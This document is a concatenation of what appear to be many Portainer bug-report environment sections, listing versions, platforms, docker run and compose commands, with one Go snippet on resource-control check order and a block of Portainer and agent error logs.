client: docker engine - community version: 19.03.6 api version: 1.40 go version: go1.12.16 git commit: 369ce74 built: thu feb 13 01:37:07 2020 os/arch: linux/arm experimental: false server: docker engine - community engine: version: 19.03.6 api version: 1.40 (minimum version 1.12) go version: go1.12.16 git commit: 369ce74 built: thu feb 13 01:31:06 2020 os/arch: linux/arm experimental: false containerd: version: 1.2.12 gitcommit: 35bd7a5f69c13e1563af8a93431411cd9ecf5021 runc: version: 1.0.0-rc10 gitcommit: dc9208a3303feef5b3839f4323d9beb36df0a9dd docker-init: version: 0.18.0 gitcommit: fec3683 * platform (windows/linux):
linux raspberrypi 4.19.97-v7l+ #1294 smp thu jan 30 13:21:14 gmt 2020 armv7l gnu/linux * output of docker ps:
container id image command created status ports names
f02106b1e2c8 portainer/portainer "/portainer" 2 weeks ago up 21 hours 0.0.0.0:9000->9000/tcp portainer * browser: mozilla firefox 73.0 x64
* portainer version: 1.23.0
* docker version (managed by portainer): 19.03.5
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: firefox 73.0b10
* portainer version: 1.23.2
* docker version (managed by portainer): 19.03.05
* platform (windows/linux): 18.04.02 lts (ubuntu)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): portainer-agent-stack.yml
* browser: firefox
* portainer version: 1.23
* docker version (managed by portainer): 19.03.2
* platform (windows/linux): linux (ubuntu 18.04.02 lts)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): portainer-agent-stack
* browser: firefox
* portainer version: 1.23.0
* docker version (managed by portainer): 19.03.5
* platform (windows/linux): docker: windows | portainer: linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): see below
* browser: chrome ```
version: '2' services: portainer: container_name: portainer image: portainer/portainer:latest restart: unless-stopped environment: - tz='america/chicago' volumes: - '/var/run/docker.sock:/var/run/docker.sock' - 'scotts_portainer_data:/data' networks: - om volumes: scotts_portainer_data: external: true networks: om: external: name: my-misc
* portainer version: 1.23.0
* docker version (managed by portainer): 19.03.5
* docker compose version: 1.24.1 (used to verify docker compose file syntax and functionality)
* platform (windows/linux): linux
* browser: chrome 79
* portainer version: 1.23.0
* docker version (managed by portainer): 19.03.05
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): portainer-agent-stack
* browser: firefox, chrome
* portainer version: 1.23.0
* docker version (managed by portainer): 19.03.05
* platform (windows/linux): linux (ubuntu 18.04)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run
* browser: firefox
* portainer version: 1.23.0
* docker version (managed by portainer): 19.03.5
* platform (windows/linux): ubuntu
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): look above
* browser: chrome
* portainer version: 1.23.0
* docker version (managed by portainer): 19.03.05
* platform (windows/linux): linux (proxmox)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): portainer-agent-stack
* browser: chrome/firefox
* portainer version: 1.23.0
* docker version (managed by portainer): 19.03.3
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: brave
* portainer version: 1.23.0
* docker version (managed by portainer): docker version 19.03.5, build 633a0ea
* platform (windows/linux): windows
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: chrome
* portainer version: 1.23
* docker version (managed by portainer): 18.09.7
* platform (windows/linux): linux, ubuntu 18.04.3
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker-compose file: ```
version: '2' services: portainer: image: portainer/portainer command: -h unix:///var/run/docker.sock privileged: true restart: always ports: - 127.0.0.1:9000:9000 - 8000:8000 volumes: - /var/run/docker.sock:/var/run/docker.sock - portainer_data:/data volumes: portainer_data:
``` * browser: both firefox dev 72 and edge 44.18362.
* portainer version: 1.20.0 (not tested in older versions) - 1.23.0
* docker version (managed by portainer): 19.03
* platform (windows/linux): linux (ubuntu 18.04 lts)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): portainer agent stack
* browser: firefox
* portainer version: 1.23.0
* docker version (managed by portainer): 19.03.5
* platform (windows/linux): ubuntu
* command used to start portainer: swarm
* browser: chrome 77 i have tracked this issue down to the order of checks in `api/http/proxy/factory/docker/containers.go` (`getinheritedresourcecontrolfromcontainerlabels`): swarmstackname := container.config.labels[resourcelabelfordockerswarmstackname] if swarmstackname != "" { return portainer.getresourcecontrolbyresourceidandtype(swarmstackname, portainer.stackresourcecontrol, resourcecontrols), nil } servicename := container.config.labels[resourcelabelfordockerserviceid] if servicename != "" { return portainer.getresourcecontrolbyresourceidandtype(servicename, portainer.serviceresourcecontrol, resourcecontrols), nil } checking `getresourcecontrolbyresourceidandtype` on stacks **first** is not ok in our case, since we manage services only (stack is found, but nil is returned)
after swapping the order (first checking the service, then stack), our use case works
i'm not sure if this change breaks anything
if not, i can create a pull request
* portainer version: 1.23.0 (introduced in portainer 1.22.0)
* docker version (managed by portainer): 19.03.05
* platform (windows/linux): rhel
* browser: safari
* portainer version: `1.23.0` (not exclusive to this version)
* docker version (managed by portainer): `19.03.5` (docker is not related to this bug)
* platform (windows/linux): `linux`
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): official instructions to deploy as a stack: $ curl -l -o portainer-agent-stack.yml $ docker stack deploy --compose-file=portainer-agent-stack.yml portainer * browser: google chrome version `78.0.3904.108 (official build) (64-bit)`
* portainer version: 1.22.2
* docker version (managed by portainer): 19.03
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): portainer agent stack
* browser: firefox
* portainer version: develop
* docker version (managed by portainer): 19.03
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): portainer agent stack
* browser: firefox
* portainer version: develop
* docker version (managed by portainer): 19.03
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): portainer agent stack
* browser: firefox
* portainer version: 1.22.2
* docker version (managed by portainer): 19.3
* platform (windows/linux): rhel
- portainer version: 1.22.2
- docker version: 19.03.4
- platform: linux
- command used to start portainer: `docker run -d --name portainer --network main -p 8000:8000 --restart=always -v portainer_data:/data portainer/portainer`
- command used to start portainer agent: `docker run -d --name portainer_agent --network main --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v /var/lib/docker/volumes:/var/lib/docker/volumes portainer/agent`
* portainer version: 1.22.2
* docker version (managed by portainer): 19.03
* platform (windows/linux): linux (proxmox)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): portainer agent stack
* browser: chrome/firefox
* portainer version: 1.22.2
* docker version (managed by portainer): 19.03
* platform (windows/linux): linux (proxmox)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): portainer agent stack
* browser: firefox/chrome **additional info:** stack shows correctly as `private` for administrators and the user that it is assigned to
* portainer version: 1.22.2
* docker version (managed by portainer): 19.03
* platform (windows/linux): linux (proxmox)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): portainer agent stack
* browser: firefox/chrome
* portainer version: 1.22.2
* docker version (managed by portainer): 19.03
* platform (windows/linux): linux (proxmox)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): portainer agent stack
* browser: firefox/chrome
* portainer version: 1.22.2
* docker version (managed by portainer): 19.03
* platform (windows/linux): linux (proxmox)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): portainer agent stack
* browser: firefox/chrome
* portainer version: 1.22.2
* docker version (managed by portainer): 19.03
* platform (windows/linux): linux (proxmox)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): portainer agent stack
* browser: firefox/chrome **additional info:**
does not affect volume browse
* portainer version: 1.22.2
* docker version (managed by portainer): 19.03
* platform (windows/linux): linux (proxmox)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): portainer agent stack
* browser: chrome/firefox
* portainer version: 1.22.2
* docker version (managed by portainer): 18.09
* platform (windows/linux): linux (proxmox)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): stack file
* browser: firefox/chrome
* portainer version: 1.22.1
* docker version (managed by portainer): 18.09.6
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): ```docker stack deploy --with-registry-auth --compose-file=portainerui-stack.yml portainerui```
* browser: chrome
* portainer version: 1.22.1
* docker version (managed by portainer): 19.03.1
* platform (windows/linux): debian linux 9
* command used to start portainer: `docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer`
* browser: firefox
* portainer version: 1.22.1
* docker version (managed by portainer):
* platform (windows/linux):
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): stack deploy
* browser: vivaldi ```
image: portainer/portainer:1.22.1
command: -h tcp://tasks.agent:9001 --tlsskipverify
- "9000:9000"
- portainer_data:/data
- agent_network
mode: replicated
replicas: 1
constraints: [node.role == manager] networks:
agent_network:
driver: overlay
attachable: true volumes:
portainer_data:
driver: edge/glusterfs-plugin:1.0
driver_opts: {}
* portainer version: 1.22.1
* docker version (managed by portainer): 19.03.2
* platform (windows/linux): ubuntu
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: chrome
* portainer version: `1.22.0`
* docker version (managed by portainer): > client: docker engine - community
> version: 19.03.4
> api version: 1.40
> go version: go1.12.10
> git commit: 9013bf583a
> built: fri oct 18 15:52:34 2019
> os/arch: linux/amd64
> experimental: false
> > server: docker engine - community
> version: 19.03.4
> api version: 1.40 (minimum version 1.12)
> go version: go1.12.10
> git commit: 9013bf583a
> built: fri oct 18 15:51:05 2019
> os/arch: linux/amd64
> experimental: false
> containerd:
> version: 1.2.10
> gitcommit: b34a5c8af56e510852c35414db4c1f4fa6172339
> version: 1.0.0-rc8+dev
> gitcommit: 3e425f80a8c931f88e6d94a8c831b9d5aa481657
> docker-init:
> version: 0.18.0
> gitcommit: fec3683 * platform (windows/linux): `linux 4.9.0-11-amd64 #1 smp debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 gnu/linux` * command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): `docker run -d -p 8000:8000 -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer` * browser: `chrome version 78.0.3904.70 (official build) (64-bit)`
* portainer version: 1.22.1
* docker version (managed by portainer): 19.03
* platform (windows/linux): linux (ubuntu 18.04.3 lts)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run
* browser: chrome **additional info:**
related to #3259
* portainer version: 1.22.1
* docker version (managed by portainer): 18.09.7
* platform (windows/linux): linux (ubuntu 18.04.3)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -d -p 9000:9000 --name portainer --restart unless-stopped -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer
* browser: safari 601.1 on ipad running ios 9.3.5
* portainer version: 1.22.1
* docker version (managed by portainer): 19.03
* platform (windows/linux): linux (ubuntu 18.04.03 lts)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run
* browser: chrome
* portainer version: 1.22.1
* docker version (managed by portainer): 19.03.3
* platform (windows/linux): redhat
* command used to start portainer: docker-compose up
* browser: safari
* portainer version: 1.22.1
* docker version (managed by portainer): 19.03.03
* platform (windows/linux): linux (ubuntu 18.04.02 lts)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run
* browser: chrome
* portainer version: 1.23.0
* docker version (managed by portainer): 19.03.05
* platform (windows/linux): linux (ubuntu 18.04)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run * browser: firefox
* portainer version: 1.22.1
* docker version (managed by portainer): 19.03.2
* platform (windows/linux): debian 9
* command used to start portainer: swarm
* browser: chrome 77
* portainer version: 1.22
* docker version (managed by portainer): * platform (windows/linux): centos
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* portainer (1.22.0)
* docker version 19.03.2 ee
* platform windows
* command used to start portainer (docker run -d --name portainer -v portainer_data:c:\\data --network portainer_agent_network --publish 9000:9000 portainer/portainer -h "tcp://tasks.portainer_agent:9001" --tlsskipverify):
* browser chrome/edge/curl
* portainer version: 1.22.0
* docker version (managed by portainer): 19.03.2 (api: 1.40)
* platform (windows/linux): debian 10
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer
* browser: chrome
* portainer version: all versions
* docker version (managed by portainer): 19.03
* platform (windows/linux): linux (ubuntu 18.04.03 lts)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer * browser: firefox 68.0.1(64 bit)
* portainer version: pr3202
* docker version (managed by portainer): ce 19.03.1
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -d -p 9000:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data registry.example.org/library/portainer:pr3202
* browser: chrome
* portainer version: 1.23.2
* docker version (managed by portainer): 19.03.8
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): stack deploy
* browser: friefox
* portainer version: 1.22.0
* docker version (managed by portainer):
* platform (windows/linux): linux 64 deb
* command used to start portainer:
version: '2'
services: portainer: image: portainer/portainer container_name: portainer command: -h unix:///var/run/docker.sock restart: always ports: - 9000:9000 - 8000:8000 volumes: - /var/run/docker.sock:/var/run/docker.sock - /opt/portainer/data:/data
* browser: chrome
* portainer version: all versions (tested on latest develop - commit #baa64ca9 )
* docker version (managed by portainer): all versions
* platform (windows/linux): all platforms
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): all ways of starting portainer
* portainer version: 1.22.0
* docker version (managed by portainer): docker version 18.09.5, build e8ff056
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -d -p 8000:8000 -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer
* browser: chrome on win 7 pro 64 - version 76.0.3809.132 (official build) (64-bit)
* portainer version: 1.22.0
* docker version (managed by portainer): on portainer host - 19.03.1, on synology - 18.09.6
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): `docker run --restart=always --name portainer -d -p 8000:8000 -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data -v /etc/portainer:/etc/portainer:ro portainer/portainer --ssl --sslcert /etc/portainer/certs/<certname>.crt --sslkey /etc/portainer/certs/<certname>.key`
* browser: safari and chrome
* portainer version: 1.22.0
* docker version (managed by portainer): 19.03.1, build 74b1e89
* platform (windows/linux): linux ubuntu 18.04
* command used to start portainer:
dockerfile --templates --admin-password-file '/auth/portainer-pass'
* browser: chrome
* portainer version: 1.20.1, 1.21.0 and latest
* docker version (managed by portainer): 19.03
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): `docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer:{tag}`
* browser: firefox
* portainer version: 1.22
* docker version (managed by portainer): 19.03 (swarm)
* platform (windows/linux): linux (ubuntu 18.04.2 lts)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -p 9000:9000 -p 8000:8000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer
* browser: chrome, firefox
* portainer version: 1.23.2
* docker version (managed by portainer): 19.03
* platform (windows/linux): windows 10
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): * browser: chrome/firefox
* portainer version: 1.22.0
* docker version (managed by portainer): 18.09
* platform (windows/linux): linux (ubuntu 18.04.2 lts)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -p 9000:9000 -p 8000:8000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer
* browser: chrome, firefox
* portainer version: 1.21.0
* target docker version (the host/cluster you manage):
* platform (windows/linux): ubuntu 18.04
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
![team details](
![errors](
![endpoint access mgmt](
* portainer version: 1.22
* docker version (managed by portainer): 18.06 (swarm)
* platform (windows/linux): linux (ubuntu 18.04.2 lts)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer
* browser: chrome, firefox
* portainer version: 1.22
* docker version (managed by portainer): 18.06
* platform (windows/linux): ubuntu (18.04.2 lts)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer
* browser: chrome
* portainer version: 1.22
* docker version (managed by portainer): 18.06
* platform (windows/linux): ubuntu (18.04.2 lts)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer
* browser: chrome, firefox
* portainer version: 1.22.0
* docker version (managed by portainer): 18.06
* platform (windows/linux): linux (ubuntu 18.04.2 lts)
* browser: chrome
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): ```
curl -l \\ -o portainer-agent-stack.yml docker stack deploy --compose-file=portainer-agent-stack.yml portainer
* portainer version: 1.19.0, 1.20.0, 1.21.0, 1.22.0 (error results depends on the image version)
* docker version (managed by portainer): 18.06.3-ce (swarm)
* platform (windows/linux): linux (ubuntu 18.04.2 lts)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -p 9000:9000 -p 8000:8000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer
* browser: chrome, firefox
* portainer version: 1.22.0
* docker version (managed by portainer): 18.09.7 (api: 1.39)
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run --rm -p 9010:9000 -v /var/run/docker.sock:/varun/docker.sock portainer/portainer
* browser: google chrome 75.0.3770.142 and internet explorer 11.239.18362.0
* portainer version: 1.21.0
* docker version (managed by portainer): 19.03.0
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: chrome
* portainer version: 1.21.0
* docker version (managed by portainer): docker version 18.09.7, build 2d0083d
* platform (windows/linux): linux
* command used to start portainer: `docker run -p 9000:9000 portainer/portainer`
* browser: multiple browsers (chrome, firefox, edge)
* portainer version: 1.21.0
* docker version (managed by portainer): * platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): ```
curl -l -o portainer-agent-stack.yml
docker stack deploy --compose-file=portainer-agent-stack.yml portainer
``` * browser:
google chrome version 75.0.3770.142 (official build) (64-bit)
* portainer version: all (develop - 92a615d)
* docker version (managed by portainer): 1.21.0
* platform (windows/linux): linux
* command used to start portainer: `run -d -p 9001:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer:latest`
* browser: chromium related to
* portainer version: 1.21.0 (develop)
* docker version (managed by portainer): 18.06.3-ce (swarm)
* platform (windows/linux): linux (ubuntu 18.04.2 lts)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): yarn start
* browser: chrome/ firefox
* portainer version: 1.21.0
* docker version (managed by portainer): 18.06.3-ce (swarm), agent version 1.3.0
* platform (windows/linux): linux (ubuntu 18.04.2 lts)
* command used to start portainer (docker run -p 9000:9000 portainer/portainer): _docker run -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer_
* browser: firefox
* portainer version: 1.21.1
* docker version (managed by portainer): 18.03.1-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): see below
* browser: firefox 67.0.4
* portainer version: 1.21.0
* docker version (managed by portainer): 18.09.5
* platform (windows/linux): ubuntu linux 18.04 lts
* command used to start portainer: `docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer` * browser: firefox 67.0.2
* portainer version: 1.21.0
* docker version (managed by portainer): 18.06.3-ce (swarm), agent version 1.3.0
* platform (windows/linux): linux (ubuntu 18.04.2 lts)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer
* browser: firefox **portainer logs:** ```
no administrator account found inside the database (err=object not found inside the database) (code=404)
2019/06/18 03:19:47 http error: unable to ping docker environment (err=get dial tcp 10.0.7.10:9001: connect: connection refused) (code=500)
2019/06/18 03:37:33 http: proxy error: context canceled
2019/06/18 03:37:38 http: proxy error: context canceled
2019/06/18 03:38:03 http: proxy error: context canceled
2019/06/18 03:38:03 http: proxy error: context canceled
2019/06/18 03:41:08 http: proxy error: context canceled
2019/06/18 03:41:08 http: proxy error: context canceled
2019/06/18 03:41:54 http: proxy error: context canceled
2019/06/18 03:41:54 http: proxy error: context canceled
2019/06/18 03:44:09 background schedule error (endpoint snapshot)
unable to create snapshot (endpoint=vagrant, url=tcp://10.0.7.10:9001) (err=error response from daemon: )
2019/06/18 04:24:09 background schedule error (endpoint snapshot)
unable to create snapshot (endpoint=vagrant, url=tcp://10.0.7.10:9001) (err=error response from daemon: )
2019/06/18 04:29:09 background schedule error (endpoint snapshot)
unable to create snapshot (endpoint=vagrant, url=tcp://10.0.7.10:9001) (err=error response from daemon: )
2019/06/18 04:37:53 http: proxy error: context canceled
2019/06/18 04:38:22 background schedule error (endpoint snapshot)
unable to create snapshot (endpoint=vagrant, url=tcp://10.0.7.10:9001) (err=error response from daemon: )
2019/06/18 04:40:08 background schedule error (endpoint snapshot)
unable to create snapshot (endpoint=vagrant, url=tcp://10.0.7.10:9001) (err=error response from daemon: )
2019/06/18 04:40:13 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 04:40:20 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 04:40:34 background schedule error (endpoint snapshot)
unable to create snapshot (endpoint=vagrant, url=tcp://10.0.7.10:9001) (err=error response from daemon: )
2019/06/18 04:59:08 background schedule error (endpoint snapshot)
unable to create snapshot (endpoint=vagrant, url=tcp://10.0.7.10:9001) (err=error response from daemon: )
2019/06/18 05:02:31 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:02:32 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:03:09 http: proxy error: context canceled
2019/06/18 05:03:11 http: proxy error: context canceled
2019/06/18 05:03:38 http: proxy error: context canceled
2019/06/18 05:04:09 http: proxy error: context canceled
2019/06/18 05:04:12 background schedule error (endpoint snapshot)
unable to create snapshot (endpoint=vagrant, url=tcp://10.0.7.10:9001) (err=error response from daemon: )
2019/06/18 05:04:53 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:07:56 http: proxy error: context canceled
2019/06/18 05:10:33 http: proxy error: context canceled
2019/06/18 05:10:34 http: proxy error: context canceled
2019/06/18 05:10:45 http: proxy error: context canceled
2019/06/18 05:10:59 http: proxy error: context canceled
2019/06/18 05:11:15 http: proxy error: context canceled
2019/06/18 05:11:32 http: proxy error: context canceled
2019/06/18 05:11:44 background schedule error (endpoint snapshot)
unable to create snapshot (endpoint=vagrant, url=tcp://10.0.7.10:9001) (err=error response from daemon: )
2019/06/18 05:11:46 http: proxy error: context canceled
2019/06/18 05:11:53 background schedule error (endpoint snapshot)
unable to create snapshot (endpoint=vagrant, url=tcp://10.0.7.10:9001) (err=error response from daemon: )
2019/06/18 05:12:39 http: proxy error: context canceled
2019/06/18 05:12:39 http: proxy error: context canceled
2019/06/18 05:12:39 http: proxy error: context canceled
2019/06/18 05:12:39 http: proxy error: context canceled
2019/06/18 05:12:39 http: proxy error: context canceled
2019/06/18 05:12:39 http: proxy error: context canceled
2019/06/18 05:12:52 http: proxy error: context canceled
2019/06/18 05:12:52 http: proxy error: context canceled
2019/06/18 05:12:54 http: proxy error: context canceled
2019/06/18 05:13:16 http: proxy error: context canceled
2019/06/18 05:13:37 http: proxy error: context canceled
2019/06/18 05:13:53 background schedule error (endpoint snapshot)
unable to create snapshot (endpoint=vagrant, url=tcp://10.0.7.10:9001) (err=error response from daemon: )
2019/06/18 05:13:55 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:13:56 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:13:56 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:13:57 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:13:58 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:13:58 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:13:59 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:14:00 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:14:00 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:14:00 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:14:00 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:14:01 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:14:01 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:14:01 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:14:01 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:14:03 http: proxy error: context canceled
2019/06/18 05:14:18 background schedule error (endpoint snapshot)
unable to create snapshot (endpoint=vagrant, url=tcp://10.0.7.10:9001) (err=error response from daemon: )
2019/06/18 05:18:39 background schedule error (endpoint snapshot)
unable to create snapshot (endpoint=vagrant, url=tcp://10.0.7.10:9001) (err=error response from daemon: )
2019/06/18 05:18:44 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:18:46 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:18:46 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:18:47 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:18:47 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:18:47 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:18:47 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:18:47 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:19:34 background schedule error (endpoint snapshot)
unable to create snapshot (endpoint=vagrant, url=tcp://10.0.7.10:9001) (err=error response from daemon: )
2019/06/18 05:20:00 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:20:00 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:20:00 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:20:03 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:20:09 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:20:09 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:20:09 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:20:11 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:20:12 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:20:12 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:20:18 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:20:18 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:20:18 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:20:18 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:20:24 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:21:26 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:21:40 background schedule error (endpoint snapshot)
unable to create snapshot (endpoint=vagrant, url=tcp://10.0.7.10:9001) (err=error response from daemon: )
2019/06/18 05:21:46 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:21:51 background schedule error (endpoint snapshot)
unable to create snapshot (endpoint=vagrant, url=tcp://10.0.7.10:9001) (err=error response from daemon: )
2019/06/18 05:22:00 background schedule error (endpoint snapshot)
unable to create snapshot (endpoint=vagrant, url=tcp://10.0.7.10:9001) (err=error response from daemon: )
2019/06/18 05:22:08 http error: unable to query endpoint (err=endpoint is down) (code=503)
2019/06/18 05:22:39 http: proxy error: context canceled
2019/06/18 05:22:59 http: proxy error: context canceled
2019/06/18 05:23:16 http: proxy error: context canceled
2019/06/18 05:23:16 http: proxy error: context canceled
2019/06/18 05:23:45 http: proxy error: context canceled
2019/06/18 05:23:45 http: proxy error: context canceled
2019/06/18 05:24:00 http: proxy error: context canceled
2019/06/18 05:24:12 http: proxy error: context canceled
2019/06/18 05:24:22 background schedule error (endpoint snapshot)
unable to create snapshot (endpoint=vagrant, url=tcp://10.0.7.10:9001) (err=error response from daemon: )
2019/06/18 05:24:27 http error: unable to query endpoint (err=endpoint is down) (code=503) ``` **agent logs:** ```
swarmstack_agent.0.yntqhuv6qont@swarmnode2 | 2019/06/18 05:31:24 [info] serf: eventmemberjoin: c4d6e5551b34 10.0.0.6
swarmstack_agent.0.yntqhuv6qont@swarmnode2 | 2019/06/18 05:31:24 [info] serf: eventmemberjoin: 3b505a83072d 10.0.0.8
swarmstack_agent.0.yntqhuv6qont@swarmnode2 | 2019/06/18 05:31:24 [info] serf: eventmemberjoin: cb97d9e3debc 10.0.0.7
swarmstack_agent.0.yntqhuv6qont@swarmnode2 | 2019/06/18 05:31:24 [info] - starting portainer agent version 1.3.0 on 0.0.0.0:9001 (cluster mode: true)
swarmstack_agent.0.3nsjixypeegm@swarmnode3 | 2019/06/18 05:31:23 [info] serf: eventmemberjoin: cb97d9e3debc 10.0.0.7
